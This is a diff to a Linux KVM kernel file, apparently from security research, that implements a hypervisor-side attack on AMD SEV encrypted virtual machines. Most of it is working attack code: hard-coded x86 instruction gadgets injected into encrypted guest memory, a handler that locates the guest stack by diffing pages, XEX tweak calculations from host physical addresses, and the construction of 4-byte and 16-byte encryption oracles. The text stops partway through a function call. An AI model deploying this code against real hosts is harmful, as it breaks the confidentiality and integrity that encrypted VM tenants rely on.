@@ -31,13 +31,6 @@
 #include <linux/plaintext_gpa_database.h>
 #include <linux/severed.h>
 
-//EDITME: Tweak the following values to fit your system
-//Note that the kaslr attack code in arch/x86/kvm/mmu.c must be tweaked
-//independently of these variables i.e defining NO_SEV here does not change
-// the behaviour of the code in arch/x86/kvm/mmu.c .
-//#define XE_VERSION // use XE version of tweak function instead of xex version
-//#define NO_SEV // do not assume encrypted memory; great for debugging
-
 uint8_t *first_mem_dump;
 uint8_t *buf_page;
 
@@ -934,217 +927,1225 @@ bool array_cmp(uint8_t *arr1, uint8_t *arr2, size_t length) {
 }
 
 
-/**
- * @arr must point to the first byte and must contain at least 4 bytes
- * Converts arr to an uint32 such that arr = {0x01,0x02,0x03,0x04} results
- * in 0x04030201. These values can than be passed as return values of cpuid
- */
-uint32_t inject_code_to_cpuid_val(uint8_t *arr) {
-  int index_cur_byte;
-  int index_max_byte = 3;
+// gets initialized in kvm/virt/kvm_main.c on KVM_INJECT_CODE ioctl
+load_gadget_t load_gadget;
+EXPORT_SYMBOL(load_gadget);
 
-  uint32_t result = 0;
-  for (index_cur_byte = 0; index_cur_byte <= index_max_byte; index_cur_byte++) {
-    uint32_t tmp = arr[index_cur_byte] << (index_cur_byte * 8);
-    result |= tmp;
-  }
-  return result;
+static uint8_t inc_variant_code[2] = {0xff, 0xc6};
+inject_param_t inc_variant = {.gpa = 0, // this is set up at run time
+                              .injection_code_buffer =
+                                  inc_variant_code, // inc esi
+                              .length = 2,
+                              .insert_at_back = 1,
+
+                              .type = 1};
+
+static uint8_t nop_variant_code[2] = {0x90, 0x90};
+inject_param_t nop_variant = {.gpa = 0, // this is set at run time
+                              .injection_code_buffer =
+                                  nop_variant_code, //  nop nop
+                              .length = 2,
+                              .insert_at_back = 1,
+                              .type = 1};
+
+static uint8_t push_push_variant_code[2] = {0x56, 0x56};
+inject_param_t push_push_variant = {.gpa = 0, // this is set at run time
+                                    .injection_code_buffer =
+                                        push_push_variant_code, //  nop nop
+                                    .length = 2,
+                                    .insert_at_back = 1,
+
+                                    .type = 1};
+
+static uint8_t push_pop_variant_code[2] = {0x56, 0x5e};
+inject_param_t push_pop_variant = {
+    .gpa = 0,                                       // this is set at run time
+    .injection_code_buffer = push_pop_variant_code, // push rsi; pop rsi
+    .length = 2,
+    .insert_at_back = 1,
+    .type = 1,
+};
+
+static uint8_t reset_jmp_variant_code[2] = {0xeb, 0x9c};
+inject_param_t reset_jmp_variant = {
+    .gpa = 0,                                        // this is set at run time
+    .injection_code_buffer = reset_jmp_variant_code, // jump 116 bytes back
+    .length = 2,
+    .insert_at_back = 0,
+    .type = 1};
+
+// pop rsi; pop rsi
+static uint8_t pop_pop_variant_code[2] = {0x5e, 0x5e};
+inject_param_t pop_pop_variant = {
+    .gpa = 0,                                      // this is set at run time
+    .injection_code_buffer = pop_pop_variant_code, // jump 116 bytes back
+    .length = 2,
+    .insert_at_back = 1,
+    .type = 1};
+
+// one ret would be enough but since the rest of the instructiosn
+// are two byte this makes jumping between them easier
+static uint8_t ret_variant_code[2] = {0xc3, 0xc3};
+inject_param_t ret_variant = {.gpa = 0, // this is set at run time
+                              .injection_code_buffer = ret_variant_code,
+                              .length = 2,
+                              .insert_at_back = 0,
+                              .type = 1};
+
+// jump 14 bytes forward to 16 byte encryption oracle
+static uint8_t jmp_to_long_code[2] = {0xeb, 0x1e};
+inject_param_t jmp_to_long_variant = {.gpa = 0,
+                                      .injection_code_buffer = jmp_to_long_code,
+                                      .length = 2,
+                                      .insert_at_back = 0,
+                                      .type = 1};
+
+//#####
+// Source of long counter gadget
+// jmp to byte 14 next block
+static uint8_t jmp_b14_code[2] = {0xeb, 0x1c};
+inject_param_t inj_jmp_14 = {.gpa = 0, // this is set at run time
+                             .injection_code_buffer = jmp_b14_code, //
+                             .length = 2,
+                             .insert_at_back = 0,
+                             .type = 1};
+
+static uint8_t xor_eax_code[2] = {0x31, 0xc0};
+inject_param_t inj_xor_eax = {.gpa = 0,
+                              .injection_code_buffer = xor_eax_code,
+                              .length = 2,
+                              .insert_at_back = 1,
+                              .type = 1};
+
+static uint8_t xor_esi_code[2] = {0x31, 0xf6};
+inject_param_t inj_xor_esi = {.gpa = 0,
+                              .injection_code_buffer = xor_esi_code,
+                              .length = 2,
+                              .insert_at_back = 1,
+                              .type = 1};
+
+static uint8_t cpuid_code[2] = {0x0f, 0xa2};
+inject_param_t inj_cpuid = {.gpa = 0,
+                            .injection_code_buffer = cpuid_code,
+                            .length = 2,
+                            .insert_at_back = 1,
+                            .type = 1};
+
+// ##### Start of variants for x1a1
+
+// nop, first byte of inc rax
+// is equal for A and B
+static uint8_t prefix_AB_code[2] = {0x90, 0x48};
+
+inject_param_t inj_prefix_A = {.gpa = 0,
+                               .injection_code_buffer = prefix_AB_code,
+                               .insert_at_back = 1,
+                               .length = 2,
+                               .type = 1};
+// jump from x1 to x2
+static uint8_t skip_A_code[2] = {0xeb, 0x1e};
+inject_param_t inj_skip_A = {.gpa = 0,
+                             .injection_code_buffer = skip_A_code,
+                             .insert_at_back = 1,
+                             .length = 2,
+                             .type = 1};
+//#### end of variants for x1a1
+
+inject_param_t inj_prefix_B = {.gpa = 0,
+                               .injection_code_buffer = prefix_AB_code,
+                               .insert_at_back = 1,
+                               .length = 2,
+                               .type = 1};
+// jump from X2||B2 to store (2 * 16 + 14 bytes forward)
+static uint8_t jmp_store_B_code[2] = {0xeb, 0x2e};
+inject_param_t inj_jmp_store_B = {.gpa = 0,
+                                  .injection_code_buffer = jmp_store_B_code,
+                                  .insert_at_back = 1,
+                                  .length = 2,
+                                  .type = 1};
+// jump 16 byte forward
+static uint8_t skip_B_code[2] = {0xeb, 0x10};
+inject_param_t inj_skip_B_code = {.gpa = 0,
+                                  .injection_code_buffer = skip_B_code,
+                                  .insert_at_back = 1,
+                                  .length = 2,
+                                  .type = 1};
+
+// jump back 5 * 16 + 4 bytes to cpuid opcode
+static uint8_t jmp_cpuid_code[2] = {0xeb, 0xac};
+inject_param_t inj_jmp_cpuid = {.gpa = 0,
+                                .injection_code_buffer = jmp_cpuid_code,
+                                .insert_at_back = 0,
+                                .length = 2,
+                                .type = 1};
+
+//#### start of store snippet
+static uint8_t nop_push_code[2] = {0x90, 0x56};
+inject_param_t inj_nop_push = {.gpa = 0,
+                               .injection_code_buffer = nop_push_code,
+                               .insert_at_back = 1,
+                               .length = 2,
+                               .type = 1};
+
+static uint8_t push_push_code[2] = {0x56, 0x56};
+inject_param_t inj_push_push = {.gpa = 0,
+                                .injection_code_buffer = push_push_code,
+                                .insert_at_back = 1,
+                                .length = 2,
+                                .type = 1};
+
+static uint8_t store_jmp_back_code[2] = {0xeb, 0xbe};
+inject_param_t inj_store_jmp_back = {.gpa = 0,
+                                     .injection_code_buffer =
+                                         store_jmp_back_code,
+                                     .insert_at_back = 0,
+                                     .length = 2,
+                                     .type = 1};
+//### end of store snippet
+
+//### start of cleanup snippet
+// pop rsi; pop rsi;
+static uint8_t pop_pop_code[2] = {0x5e, 0x5e};
+inject_param_t inj_pop_pop = {.gpa = 0,
+                              .injection_code_buffer = pop_pop_code,
+                              .insert_at_back = 1,
+                              .length = 2,
+                              .type = 1};
+
+static uint8_t pop_ret_code[2] = {0x5e, 0xc3};
+inject_param_t inj_pop_ret = {.gpa = 0,
+                              .injection_code_buffer = pop_ret_code,
+                              .insert_at_back = 0,
+                              .length = 2,
+                              .type = 1};
+
+static uint8_t ret_code[2] = {0xc3};
+inject_param_t inj_ret = {.gpa = 0,
+                          .injection_code_buffer = ret_code,
+                          .insert_at_back = 0,
+                          .length = 1,
+                          .type = 1};
+
+//### end of cleanup snippet
+
+// This is the standard version of the 16 byte encrytion oracle
+// This is loaded after we are done with the 4 byte encryption oracle
+// The blocks created with the 4 byte encryption oracle have to be loaded
+// manually via write physical
+enum long_counter_base_content {
+    LCB_INJ_JMP_14_1, //inj_jmp_14,
+    LCB_INJ_XOR_EAX,//inj_xor_eax,
+    LCB_INJ_JMP_14_2, //inj_jmp_14,
+    LCB_INJ_XOR_ESI, //inj_xor_esi,
+    LCB_INJ_JMP_14_3, //inj_jmp_14,
+    LCB_INJ_CPUID, //inj_cpuid,
+    LCB_INJ_JMP_14_4,//inj_jmp_14,
+    LCB_INJ_PREFIX_A,//inj_prefix_A,
+    LCB_INJ_PREFIX_B,//inj_prefix_B,
+    LCB_INJ_JMP_CPUID,//inj_jmp_cpuid,
+};
+
+//TODO: Split this up into template and real data like with
+//"long_counter_extra"
+static inject_param_t *long_counter_base_inj[10] = {
+    &inj_jmp_14,
+    &inj_xor_eax,
+    &inj_jmp_14,
+    &inj_xor_esi,
+    &inj_jmp_14,
+    &inj_cpuid,
+    &inj_jmp_14,
+    &inj_prefix_A,
+    // in gpa space we skip one block for long instruction
+    &inj_prefix_B,
+    // in gpa space we skip one block for long instruction
+    &inj_jmp_cpuid,
+};
+static uint8_t long_counter_base_inj_cache[10][16];
+
+
+
+typedef struct  {
+	inject_param_t inj;
+	uint8_t buffer[16]; // 16 byte buffer with precalculated injection code;
+} buffered_inj_obj;
+
+enum long_counter_extra_content {
+	LCE_INJ_SKIP_A,
+	LCE_INJ_JMP_STORE_B,
+	LCE_INJ_NOP_PUSH,
+	LCE_INJ_PUSH_PUSH,
+	LCE_ST_INJ_JMP_14,
+	LCE_ST_INJ_XOR_ESI,
+	LCE_ST_INJ_STORE_JMP_BACK
+};
+
+#define LCE_SIZE 7
+//content list
+static inject_param_t *long_counter_extra_inj_tmpl[LCE_SIZE] = {
+	&inj_skip_A,
+	&inj_jmp_store_B,
+	&inj_nop_push,
+	&inj_push_push,
+	&inj_jmp_14,
+	&inj_xor_esi,
+	&inj_store_jmp_back
+};
+
+//filled at the end of counter_gadget with precalculated values
+//based on the template above
+static buffered_inj_obj long_counter_extra_inj[LCE_SIZE];
+
+//#####
+
+static uint8_t long_inc_jmp_block[16];
+static uint64_t long_inc_jmp_source_gpa;
+static uint64_t long_inc_jmp_target_gpa;
+static uint64_t long_inc_jmp_hpa_diff;
+
+static uint8_t long_shl_jmp_block[16];
+static uint64_t long_shl_jmp_source_gpa;
+static uint64_t long_shl_jmp_target_gpa;
+static uint64_t long_shl_jmp_hpa_diff;
+
+static void precalc_injection(inject_param_t **template,
+buffered_inj_obj *non_template, int index, uint64_t target_gpa,
+struct kvm *kvm) {
+	//make a copy of template
+	memcpy(&non_template[index].inj,template[index],sizeof(inject_param_t));
+
+	//set gpa in copy
+	non_template[index].inj.gpa = target_gpa;
+
+	nf_simple_inject_code_precalc(kvm,&non_template[index].inj,
+			non_template[index].buffer);
+
 }
 
-void get_source_target_tweakdiff(struct kvm *kvm, uint64_t source_gpa,
-                                 uint64_t target_gpa, uint8_t tweak_buf[16]) {
-#ifdef NO_SEV
-  memset(tweak_buf, 0, 16);
-#else
-  // convert to hpa
-  uint64_t source_hpa, target_hpa;
+uint64_t calc_stack_alignment_offset(void) {
+  // TODO: checkif this is correct: seems like we get the fault offset after the
+  // push that issued it. but we want the offset from before
+  // load_gadget.fault_gpa -= 8;
+  if (load_gadget.fault_gpa % 16 == 8) {
+    return 8;
+  } else if (load_gadget.fault_gpa % 16 == 0) {
+    return 0;
+  }
+  // we should not reach this
+  WARN_ON(true);
+  return 0;
+}
+
+static void store_stack_and_abort(struct kvm_vcpu *vcpu) {
   int err;
-  err = get_hpa_for_gpa(kvm, source_gpa, &source_hpa);
+  uint64_t alignment_offset;
+  uint8_t tweak_buf[16];
+
+  // should be either 0 or 8
+  printk("First stack fault address was gpa = %016llx\n",
+         load_gadget.fault_gpa);
+  // alignment_offset = load_gadget.fault_gpa % 16;
+  alignment_offset = calc_stack_alignment_offset();
+
+  wbinvd();
+
+  err = read_mapped(long_inc_jmp_source_gpa, long_inc_jmp_block, 16,
+                    load_gadget.stack_mapping);
   if (err != 0) {
-    printk("File %s line %d: get_hpa_for_gpa failed with %d\n", __FILE__,
-           __LINE__, err);
-    return;
+    printk("handle_counter_gadget: failed to read first block from gpa "
+           "%016llx\n",
+           long_inc_jmp_source_gpa);
+  } else {
+    printk("handle_counter_gadget: Read first payload block from stack from  "
+           "gpa = "
+           "%016llx to gpa = %016llx\n",
+           long_inc_jmp_source_gpa, long_inc_jmp_source_gpa + 16);
   }
-  err = get_hpa_for_gpa(kvm, target_gpa, &target_hpa);
+  // apply tweak diff for xex sev version
+  calc_tweak(long_inc_jmp_hpa_diff, tweak_buf);
+  xor_in_place(long_inc_jmp_block, tweak_buf);
+
+  err = read_mapped(long_shl_jmp_source_gpa, long_shl_jmp_block, 16,
+                    load_gadget.stack_mapping);
   if (err != 0) {
-    printk("File %s line %d: get_hpa_for_gpa failed with %d\n", __FILE__,
-           __LINE__, err);
-    return;
+    printk("handle_counter_gadget: failed to read second block from  stack "
+           "from gpa "
+           "%016llx\n",
+           long_shl_jmp_source_gpa);
+  } else {
+    printk("handle_counter_gadget: Read second payload block from stack from  "
+           "gpa = "
+           "%016llx to gpa = %016llx\n",
+           long_shl_jmp_source_gpa, long_shl_jmp_source_gpa + 16);
   }
-  //printk("source hpa is %016llx and target hpa is %016llx\t xor is:"
-   //  "%016llx\n", source_hpa, target_hpa, source_hpa ^ target_hpa);
-                  
-  calc_tweak(source_hpa ^ target_hpa, tweak_buf);
-#endif
+  // apply tweak diff for xex sev version
+  calc_tweak(long_shl_jmp_hpa_diff, tweak_buf);
+  xor_in_place(long_shl_jmp_block, tweak_buf);
+
+  wbinvd();
+
+  pop_pop_variant.gpa = load_gadget.last_gpa - (3 * 16);
+  if (!inject_code(vcpu->kvm, pop_pop_variant.gpa,
+                   pop_pop_variant.injection_code_buffer,
+                   pop_pop_variant.length, pop_pop_variant.insert_at_back)) {
+    printk("handle_counter_gadget: failted to write push push to inc pos\n");
+  }
+  pop_pop_variant.gpa = load_gadget.last_gpa - (1 * 16);
+  if (!inject_code(vcpu->kvm, pop_pop_variant.gpa,
+                   pop_pop_variant.injection_code_buffer,
+                   pop_pop_variant.length, pop_pop_variant.insert_at_back)) {
+    printk("handle_counter_gadget: failted to write push push to shl pos\n");
+  }
+
+  /*
+        //Code for aborting after the 4 byte encryption oracle is done
+  ret_variant.gpa = load_gadget.last_gpa;
+  if (!inject_code(vcpu->kvm, ret_variant.gpa,
+                   ret_variant.injection_code_buffer, ret_variant.length,
+                   ret_variant.insert_at_back)) {
+    printk("handle_counter_gadget: failed to insert ret at last jump\n");
+  }
+  printk("handle_counter_gadget: processed all cleanup injections\n");
+  */
+  // Code for jumping to 16 byte encryption oracle after 4 byte encryption
+  // oracle is done
+  jmp_to_long_variant.gpa = load_gadget.last_gpa;
+  if (!inject_code(vcpu->kvm, jmp_to_long_variant.gpa,
+                   jmp_to_long_variant.injection_code_buffer,
+                   jmp_to_long_variant.length,
+                   jmp_to_long_variant.insert_at_back)) {
+    printk(
+        "handle_counter_gadget: failed to insert jump to long at last jump\n");
+  } else {
+    printk("handle_counter_gadget: processed cleanup and jmp to long "
+           "injections. jmp to long was inserted at gpa = %016llx\n",
+           load_gadget.last_gpa);
+  }
 }
 
-/**
- * Injects @code in the "cpuid cycles" @cpuid_start_counter and
- * cpuid_start_counter +1. Then do cleanup afterwards
- */
-void inject_16_byte(uint64_t cpuid_start_counter,
-                    uint64_t current_cpuid_counter, uint8_t *code,
-                    uint64_t size, uint32_t *eax, uint32_t *ebx, uint32_t *ecx,
-                    uint32_t *edx, uint8_t *tweak_diff, struct kvm_vcpu *vcpu,
-                    uint64_t source_gpa, uint64_t target_gpa) {
 
-  // ATTENTION: setting e.g. eax = 0x04030201 will result in 01 02 03 04 in
-  // memory
-  // controls if the read and write functions apply host decryption
-  bool dec_control;
-  static uint8_t orig_code[16];
-  static bool stored_orig_code = false;
+//TODO: Code is messy. Best practice would be to precalulate all injections
+//to improve performance. Currently this is only done in the long_counter_gadget
+//as it's the most performance critical
 
-  //EDITME: Tweak this variable to change 
-  // often we repeat the injection of the 16 byte block, before
-  // restoring the original code
-  const uint64_t max_round_counter = 10;
-
-  static uint64_t round_counter = 0;
-  static struct page *source_page;
-  static struct page *target_page;
-  static void *source_mapping;
-  static void *target_mapping;
-
-#ifdef NO_SEV
-  dec_control = true;
-#else
-  dec_control = false;
-#endif
-  if (size != 16) {
-    printk("Error. call inject_16_byte with a 16 byte array!\n");
+static void handle_counter_gadget(struct kvm_vcpu *vcpu, uint32_t eax) {
+#undef LOG
+  //#define LOG
+  const int highest_bit_index = 31;
+  // contains the shl and jmp instruction at the end of the gadget. They
+  // get overwritten at the end of the first round and must be restored at
+  // the start of the second round
+  static uint8_t shl_back_jump[32];
+  int err;
+  // dummy value to signal that no load gadget is used
+  if (load_gadget.target_value == 0 || load_gadget.type != 1) {
     return;
   }
 
-  if (round_counter < max_round_counter) {
-    current_cpuid_counter = current_cpuid_counter % 4;
-    if (current_cpuid_counter == 0) {
-      current_cpuid_counter = 1;
+  if (load_gadget.text_mapping == NULL) {
+    if (0 != map_physical(vcpu->kvm, load_gadget.last_gpa, false,
+                          &load_gadget.text_mapping, &load_gadget.text_page)) {
+      printk("handle_counter_gadget: failed to get text mapping\n");
+    } else {
+      printk("mapped text page. load_gadget.text_mapping = %p "
+             "load_gadget.text_page = %p\n",
+             load_gadget.text_mapping, load_gadget.text_page);
     }
-    /*printk("In Round %d with current_cpuid_counter %lld", round_counter,
-           current_cpuid_counter);
-                          */
-  }
-  if (round_counter == max_round_counter) {
-    current_cpuid_counter = 4;
+    printk("start of first gadget %lld\n", ktime_get_real_ns());
+
+
   }
 
-  if (round_counter == 0 && current_cpuid_counter == cpuid_start_counter) {
-    printk("Start of Gadget in ns epoch %lld\n", ktime_get_real_ns());
-    map_physical(vcpu->kvm, source_gpa, false, &source_mapping, &source_page);
-    map_physical(vcpu->kvm, target_gpa, false, &target_mapping, &target_page);
+  //########
+  // Inital wbinvd()
+  wbinvd();
+  //#######
+
+  // calc&store the stack gpa and stop tracking
+  if (load_gadget.round == 1 && load_gadget.curr_bit == highest_bit_index) {
+    uint64_t alignment_offset,changed_offset;
+    int off,i;
+    int block_changed,changes;
+
+	 // stop listening for page faults
+    load_gadget.waiting_for_fault = 0;
+
+	 //take another copy of the page containing the stack. This time the content was
+	 //already manipulated
+	 printk("re read stack page");
+	 void * stack_page_post_write = vmalloc(4096);
+     int err = read_physical(vcpu->kvm, load_gadget.tmp_fault_gpa & ~0xfff,
+			  stack_page_post_write, 4096,false);
+	  if( err != 0 ) {
+		  printk("failed to re read stack page with %d\n",err);
+	  }
+
+	  //compare both pages and find the 16b block that has changed. Combine it with
+	  //the gfn from the page fault to get the gpa of the stack
+	  
+	  //loop over every 16 byte block
+	  for(off = 0,changes=0; off < 0x1000; off += 0x010) {
+		  block_changed = 0;
+		  //check if block has changed
+		  for(i = 0; i < 0x010; i++ ) {
+			  if( ((uint8_t*)stack_page_post_write)[off + i] != 
+					  ((uint8_t*)load_gadget.stack_page_pre_write)[off + i] ) {
+				  printk("gpa %016llx changed at offset %04x\n",load_gadget.tmp_fault_gpa,off);
+				  //store offset
+				  changed_offset = off;
+				  //we expect that only one 16 byte block differs. Couting the amount of changed
+				  //blocks is just a sanity check
+				  changes++;
+				  break;
+			  }
+		  }
+	  }
+
+	  //combine gfn and offset from loop above, if there has only been one change.
+	  //otherwise print a warning
+	  if( changes == 1 ) {
+		  printk("only one 16 byte block changed. take %04llx as offset\n",changed_offset);
+		  load_gadget.tmp_fault_gpa |= changed_offset;
+	  }
+	  else {
+		  printk("Somehting went wrong. %d 16 byte blocks have changed instead of one."
+				  "Cannot determine offset\n",changes);
+	  }
+
+	  vfree(load_gadget.stack_page_pre_write);
+
+
+
+    load_gadget.fault_gpa = load_gadget.tmp_fault_gpa;
+    kvm_stop_tracking(vcpu);
+    printk("handle_stack_detect_gadget: done. Detected stack at gpa %016llx\n",
+           load_gadget.fault_gpa);
+
+    if (load_gadget.stack_page == NULL) {
+      if (0 != map_physical(vcpu->kvm, load_gadget.fault_gpa, false,
+                            &load_gadget.stack_mapping,
+                            &load_gadget.stack_page)) {
+        printk("handle_counter_gadget: failed to get text mapping\n");
+      }
+    } else {
+      printk("mapped stack page");
+    }
+
+    // calc source and target gpa of payload blocks
+    alignment_offset = calc_stack_alignment_offset();
+
+    long_inc_jmp_source_gpa = load_gadget.fault_gpa - alignment_offset;
+    long_inc_jmp_target_gpa = load_gadget.last_gpa + (10 * 16);
+
+    long_shl_jmp_source_gpa = load_gadget.fault_gpa - alignment_offset - 16;
+    long_shl_jmp_target_gpa = load_gadget.last_gpa + (12 * 16);
   }
 
-  if (current_cpuid_counter == cpuid_start_counter) { // inject 1
-    // printk("in + 0\n");
-    // inject first 4 byte in edx
-    *edx = inject_code_to_cpuid_val(code);
-    // printk("cpuid call nr. %lld, setting edx to %08x\n",
-    // current_cpuid_counter,
-    //         *edx);
-
-  } else if (current_cpuid_counter == cpuid_start_counter + 1) { // inject 2
-    // printk("in +1\n");
-    // inject 12 byte in eax, ebx, ecx (in this order from left to right)
-    *eax = inject_code_to_cpuid_val(code + 4);
-    *ebx = inject_code_to_cpuid_val(code + 8);
-    *ecx = inject_code_to_cpuid_val(code + 12);
-
-    // printk("cpuid call nr. %lld, setting eax to %08x\t ebx to %08x\t ecx to "
-    //      "%08x\n",
-    //     current_cpuid_counter, *eax, *ebx, *ecx);
-
-  } else if (current_cpuid_counter == cpuid_start_counter + 2) { // move cycle
-    // move code from previous two calls into position
-    uint8_t injected_data[16];
+  // apply tweak diff to target value and bswap it (exclude first round because
+  // that is for stack detect, compare with highest bit because we only want to
+  // do this once per target_value)
+  if ((load_gadget.round == 1 || load_gadget.round == 2) &&
+      load_gadget.curr_bit == highest_bit_index) {
+    uint8_t tweak_buf[16];
+    uint32_t short_tweak;
+    uint64_t source_hpa, source_gpa, target_hpa, target_gpa;
     int err;
-    // printk("in +2\n");
 
-    // store original code for replay
-#ifndef NO_SEV
-    // flush make sure vm writes content to ram
+    if (load_gadget.round == 1) {
+      source_gpa = long_inc_jmp_source_gpa;
+      // 16 byte encryption gadget starts 2 * 16 byte after load_gadget.last_gpa
+      target_gpa = long_inc_jmp_target_gpa;
+    } else {
+      source_gpa = long_shl_jmp_source_gpa;
+      target_gpa = long_shl_jmp_target_gpa;
+    }
+
+    // resolve GPAs to HPAs
+    if (0 != (err = get_hpa_for_gpa(vcpu->kvm, source_gpa, &source_hpa))) {
+      printk("handle_counter_gadget: round %d: failed to convert source gpa "
+             "%016llx "
+             "to hpa wiht err %d\n",
+             load_gadget.round, source_gpa, err);
+    }
+    if (0 != (err = get_hpa_for_gpa(vcpu->kvm, target_gpa, &target_hpa))) {
+      printk("handle_counter_gadget: round %d: failed to convert target gpa "
+             "%016llx "
+             "to hpa wiht err %d\n",
+             load_gadget.round, target_gpa, err);
+    }
+
+    if (load_gadget.round == 1) {
+      long_inc_jmp_hpa_diff = source_hpa ^ target_hpa;
+    } else if (load_gadget.round == 2) {
+      long_shl_jmp_hpa_diff = source_hpa ^ target_hpa;
+    }
+
+#ifdef LOG
+    printk("handle_counter_gadget: calling calc_tweak with HPAs %016llx xor "
+           "%016llx\n",
+           source_hpa, target_hpa);
+#endif
+    calc_tweak(source_hpa ^ target_hpa, tweak_buf);
+    print_blockwise(tweak_buf, 16);
+    // get first 4 bytes of tweak
+    short_tweak = (((uint32_t)tweak_buf[0]) << (3 * 8)) |
+                  (((uint32_t)tweak_buf[1]) << (2 * 8)) |
+                  (((uint32_t)tweak_buf[2]) << (1 * 8)) |
+                  ((uint32_t)tweak_buf[3]);
+
+#ifdef LOG
+    printk(
+        "handle_counter gadget: prepare target_value for move from gpa %016llx"
+        " to gpa %016llx\n. Apply Tweak %08x\n",
+        source_gpa, target_gpa, short_tweak);
+#endif
+    load_gadget.target_value = load_gadget.target_value ^ short_tweak;
+#ifdef LOG
+    printk("target value before tweak %16llxx and after tweak: %016llx\n",
+           load_gadget.target_value ^ short_tweak, load_gadget.target_value);
+#endif
+    // bswap: target.value gets written as little endian but we want to enter
+    // values from "left to right" for better readability
+    load_gadget.target_value = __builtin_bswap32(load_gadget.target_value);
+  }
+
+#ifdef LOG
+  printk("handle_counter_gadget: called with eax = %08x, expected %08x"
+         "target_value = %016llx cur_bit = %lld\n",
+         eax, load_gadget.prev_eax, load_gadget.target_value,
+         load_gadget.curr_bit);
+#endif
+
+  if (eax != load_gadget.prev_eax) {
+#ifdef LOG
+    printk("handle_counter_gadget: at repetition_counter %lld. Expected eax == "
+           "%d but got %d\n",
+           load_gadget.repetition_counter, load_gadget.prev_eax, eax);
+#endif
+    load_gadget.repetition_counter = 0;
+    // extra wbinvd() due to return
     wbinvd();
-    //__flush_tlb_all();
-#endif
-    if (!stored_orig_code) {
-      err = read_mapped(target_gpa, orig_code, 16, target_mapping);
-      if (err != 0) {
-        printk("error reading at target_gpa\n");
-      }
-      printk("target code content");
-      print_blockwise(orig_code, 16);
-      stored_orig_code = true;
-    }
-
-    // read injected code and apply tweak to ciphertext
-    err = read_mapped(source_gpa, injected_data, 16, source_mapping);
-    if (err != 0) {
-      printk("error reading at source_gpa\n");
-    }
-     printk("Data structure Content");
-     print_blockwise(injected_data, 16);
-
-    //injected data already has tweak xored. xoring tweak to the ciphertext
-    //is only needed in xex mode
-#if !defined(NO_SEV) && !defined (XE_VERSION) 
-    xor_in_place(injected_data, tweak_diff);
-#endif
-
-    // only in the first round
-    if (round_counter == 0) {
-      printk("wrote ciphertext to target\n");
-      // move ciphertext to target location
-      err = write_mapped(target_gpa, 16, injected_data, target_mapping);
-      if (err != 0) {
-        printk("Error writing injected to target_gpa\n");
-      }
-#ifndef NO_SEV
-      wbinvd(); // force our version to ram
-                //__flush_tlb_all();
-#endif
-      err = read_mapped(target_gpa, injected_data, 16, target_mapping);
-      if (err != 0) {
-        printk("error reading at target_gpa\n");
-      }
-      // printk("exected move. target code content after injection");
-      // print_blockwise(injected_data, 16);
-    }
-
-    round_counter++;
-  } else if ((current_cpuid_counter == cpuid_start_counter + 3) &&
-             (round_counter = max_round_counter)) { // restore oric cycle
-    int err;
-    uint8_t buf[16];
-
-    // printk("in +3\n");
-
-    // restore orig code
-    BUG_ON(!stored_orig_code);
-#ifndef NO_SEV
-    wbinvd(); // force guest to write back
-              //__flush_tlb_all();
-#endif
-    err = write_mapped(target_gpa, 16, orig_code, target_mapping);
-#ifndef NO_SEV
-    wbinvd(); // force our version to ram
-              //__flush_tlb_all();
-#endif
-    if (err != 0) {
-      printk("Error writing original data to target_gpa\n");
-    }
-    err = read_physical(vcpu->kvm, target_gpa, buf, 16, target_mapping);
-    if (err != 0) {
-      printk("error reading at target_gpa\n");
-    }
-    printk("target code content after restore");
-    print_blockwise(buf, 16);
-
-    unmap_physical(&source_mapping, &source_page);
-    unmap_physical(&target_mapping, &target_page);
-    printk("End of Gadget in ns epoch %lld\n", ktime_get_real_ns());
-
-    round_counter++;
+    return;
   }
+
+  // Workround to implement stack detect gadget in round 0
+  if (load_gadget.round == 0) {
+    load_gadget.curr_bit = 0;
+  }
+
+  // restore shl and normal back jump. They got overwritten with push push
+  // reset back jump at the end of the previous round
+  if (load_gadget.round == 2 && load_gadget.curr_bit == highest_bit_index) {
+
+    if (0 != (err = write_mapped(load_gadget.last_gpa - 16, 32, shl_back_jump,
+                                 load_gadget.text_mapping))) {
+      printk("handle_counter_gadget: faile to restore normal back jump code "
+             "at gpa %016llx\n",
+             load_gadget.last_gpa);
+    } else {
+#ifdef LOG
+      printk("restored shl and normal back jump\n");
+#endif
+    }
+  }
+
+  // Copy values from stack and jump to 16 byte encryption oracle
+  if (load_gadget.round == 3 && load_gadget.curr_bit == highest_bit_index) {
+    int i;
+    uint64_t gpa = load_gadget.last_gpa;
+    gpa += (1 * 16); // TODO: workaround for weird 0x.....200 bug/behaviour
+    store_stack_and_abort(vcpu);
+
+#ifdef LOG
+    printk("load_gadget.last_gpa is %016llx\n", gpa);
+    printk("Start loading 16 byte oracle\n");
+#endif
+	 //PRECALC 16 byte encryption oracle
+	 
+    // load 16 byte encryption  oracle
+    for (i = 0;
+         i < sizeof(long_counter_base_inj) / sizeof(long_counter_base_inj[0]);
+         i++) {
+      inject_param_t *inj = long_counter_base_inj[i];
+      if (i == 8 || i == 9) {
+        gpa += (2 * 16);
+      } else {
+        gpa += (1 * 16);
+      }
+      inj->gpa = gpa;
+		//this call is used to precalc the injected data
+		nf_simple_inject_code_precalc(vcpu->kvm,inj,long_counter_base_inj_cache[i]);
+
+#ifdef LOG
+      printk("at i = %d: injecting: %02x %02x at gpa %016llx %016llx\n", i,
+             inj->injection_code_buffer[0], inj->injection_code_buffer[1],
+             inj->gpa, gpa);
+#endif
+
+		/*
+      if (!nf_simple_inject_code(vcpu->kvm, inj, load_gadget.text_mapping)) {
+        printk("failed to load part %d of 16 byte encryption oracle\n", i);
+      }
+		*/
+
+		  if( !nf_buffered_inject(vcpu->kvm,inj, long_counter_base_inj_cache[i],
+					load_gadget.text_mapping) ) {
+        		printk("failed to load part %d of 16 byte encryption oracle\n", i);
+		  }
+    }
+
+	 //PRECALC OHTER INSTRUCTIONS USED IN 16 BYTE ORACLE
+
+	 //signature: template array, non template array, index in prevous arrays,
+	 //target gpa
+	 precalc_injection(long_counter_extra_inj_tmpl,long_counter_extra_inj,
+			 LCE_INJ_SKIP_A, long_counter_base_inj[LCB_INJ_PREFIX_A]->gpa,
+			 vcpu->kvm);
+
+	 precalc_injection(long_counter_extra_inj_tmpl,long_counter_extra_inj,
+			 LCE_INJ_JMP_STORE_B, long_counter_base_inj[LCB_INJ_PREFIX_B]->gpa,
+			 vcpu->kvm);
+
+	 precalc_injection(long_counter_extra_inj_tmpl,long_counter_extra_inj,
